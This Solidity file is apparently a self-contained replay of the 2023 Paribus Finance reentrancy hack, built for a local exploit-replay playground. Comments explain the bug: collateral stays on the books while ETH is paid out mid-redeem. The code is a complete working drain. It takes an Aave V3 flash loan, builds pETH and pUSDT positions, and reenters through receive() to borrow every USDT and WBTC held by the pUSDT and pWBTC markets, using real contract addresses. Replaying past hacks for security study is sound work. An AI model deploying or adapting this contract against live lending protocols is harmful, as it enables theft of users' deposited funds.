// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-Paribus).
// The DeFiHackLabs PoC (test/Paribus_exp.sol) runs the whole attack INLINE in
// the Foundry test contract (attacker = address(this); the Aave V3 flash-loan
// callback `executeOperation` and the reentrant `receive()` both live on the
// test contract itself), so there is no standalone contract to deploy as-is.
// This file is a faithful, self-contained copy of that inline attack (logic
// and constants copied verbatim from ContractTest.testExploit/executeOperation
// and the Exploiter helper) so the playground can deploy it and record run().
//
// Root cause (real Paribus Finance hack, Arbitrum, 2023-04-11, tx
// 0x0e29dcf4e9b211a811caf00fc8294024867bffe4ab2819cc1625d2e9d62390af):
// Paribus is a Compound V2 fork. PToken.redeemFresh() sends the underlying
// out to the redeemer (doTransferOut) BEFORE it decrements the redeemer's
// pToken collateral balance (accountTokens[redeemer] = ...). For the pETH
// market, doTransferOut sends raw native ETH, which hands control to the
// redeemer's receive()/fallback() while the collateral is still fully on the
// books. The per-market nonReentrant modifier does not help because it only
// locks the pETH contract itself -- the attacker reenters a *different*
// market (pUSDT, pWBTC) whose comptroller borrow-allowed check reads the
// still-stale (not yet decremented) account snapshot for pETH, so the extra
// borrows pass as if the redeemed collateral were still posted.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256 wad) external;
}

interface ICErc20Delegate {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// NOTE: the original DeFiHackLabs test also converts the stolen USDT/WBTC to
// WETH via a Curve tricrypto pool (curvePool.exchange(...)) as a final
// profit-realization/laundering step. That pool internally STATICCALLs an
// auxiliary Curve "Math" library contract (0x2F0AF8eC...dba9DaF) for its
// Newton's-method invariant math. That auxiliary contract was never captured
// by this PoC's anvil_state.json fork dump (it is not one of the 49 accounts
// touched during the original test's execution trace, only referenced via an
// internal call the dumper didn't walk into), so it has no code in the
// replayed state and the STATICCALL silently returns empty data, which the
// pool's own bytecode treats as a failure and reverts. This is a fork-dump
// gap in a downstream currency-conversion step, NOT part of the reentrancy
// vulnerability itself -- the attacker has already fully extracted the
// mispriced pUSDT/pWBTC borrows by the time this conversion would run. This
// synthetic exploit therefore stops right after repaying the Aave flash
// loan and measures profit directly in the un-converted stolen USDT.

// The Exploiter helper: mints a second, independent pETH position (100 ETH)
// so that when the main contract's redeem() reenters, the total pETH cash
// drained (and the collateral value still on the books) is large enough to
// support the extra pUSDT/pWBTC borrows. It also unwinds its own pETH
// position and forwards the ETH back to the main exploit at the end.
contract ParibusReentrancyExploiter {
    IWETH9 constant WETH = IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    ICErc20Delegate constant pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);

    function mint() external payable {
        WETH.withdraw(WETH.balanceOf(address(this)));
        payable(address(pETH)).call{value: address(this).balance}("");
    }

    function redeem() external payable {
        pETH.redeem(pETH.balanceOf(address(this)));
        payable(address(WETH)).call{value: address(this).balance}("");
        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
    }

    receive() external payable {}
}

contract ParibusReentrancyDrain {
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IWETH9 constant WETH = IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    ICErc20Delegate constant pUSDT = ICErc20Delegate(0xD3e323a672F6568390f29f083259debB44C41f41);
    ICErc20Delegate constant pWBTC = ICErc20Delegate(0x367351F854506DA9B230CbB5E47332b8E58A1863);
    ICErc20Delegate constant pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);
    IAaveFlashloan constant aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IUnitroller constant unitroller = IUnitroller(0x2130C88fd0891EA79430Fb490598a5d06bF2A545);

    ParibusReentrancyExploiter public exploiter;
    uint256 public nonce;

    // Recorded entrypoint: flash-loan 200 WETH + 30,000 USDT from Aave V3.
    // Everything else happens inside executeOperation() (the Aave callback).
    // (See the note above CurvePool interfaces used to sit here -- the
    // post-attack USDT/WBTC -> WETH conversion leg is intentionally omitted.)
    function run() external {
        address[] memory assets = new address[](2);
        assets[0] = address(WETH);
        assets[1] = address(USDT);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 200 * 1e18;
        amounts[1] = 30_000 * 1e6;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external payable returns (bool) {
        USDT.approve(address(aaveV3), type(uint256).max);
        WETH.approve(address(aaveV3), type(uint256).max);
        USDT.approve(address(pUSDT), type(uint256).max);
        WBTC.approve(address(pWBTC), type(uint256).max);

        // Deploy the helper and give it 100 of the 200 flash-loaned WETH so it
        // can independently mint its own pETH collateral position.
        exploiter = new ParibusReentrancyExploiter();
        WETH.transfer(address(exploiter), 100 * 1e18);
        exploiter.mint();

        // Mint pETH with the remaining ~100 WETH (unwrap to native ETH, send
        // to the pETH market's fallback/mint path).
        WETH.withdraw(WETH.balanceOf(address(this)));
        payable(address(pETH)).call{value: address(this).balance}("");

        // Mint pUSDT with the flash-loaned USDT.
        pUSDT.mint(USDT.balanceOf(address(this)));

        address[] memory cTokens = new address[](2);
        cTokens[0] = address(pETH);
        cTokens[1] = address(pUSDT);
        unitroller.enterMarkets(cTokens);

        // Drain pETH's cash down to a useful level before redeeming.
        pETH.borrow(13_075_471_156_463_824_220);

        // Reentrancy enter point: redeemFresh() pays out ETH via a raw call
        // BEFORE it decrements accountTokens[redeemer] -- this hands control
        // to receive() below while the pETH collateral is still on the books.
        pETH.redeem(pETH.balanceOf(address(this)));

        // Unwind the helper's independent pETH position too, forwarding its
        // ETH back here.
        exploiter.redeem();
        payable(address(WETH)).call{value: address(this).balance}("");
        return true;
    }

    // Reentrant callback: fires while pETH.redeem() is still mid-flight (its
    // native-ETH doTransferOut lands here before accountTokens[] is zeroed).
    // On the SECOND reentry (nonce == 2 -- once for the main redeem's payout,
    // once for the helper's independent position unwind interleaved via
    // mint() below) it borrows from pUSDT/pWBTC while the comptroller still
    // sees the pre-redeem (stale) pETH collateral snapshot.
    receive() external payable {
        if (nonce == 2) {
            pUSDT.borrow(USDT.balanceOf(address(pUSDT)));
            pWBTC.borrow(WBTC.balanceOf(address(pWBTC)));
        }
        nonce++;
    }
}
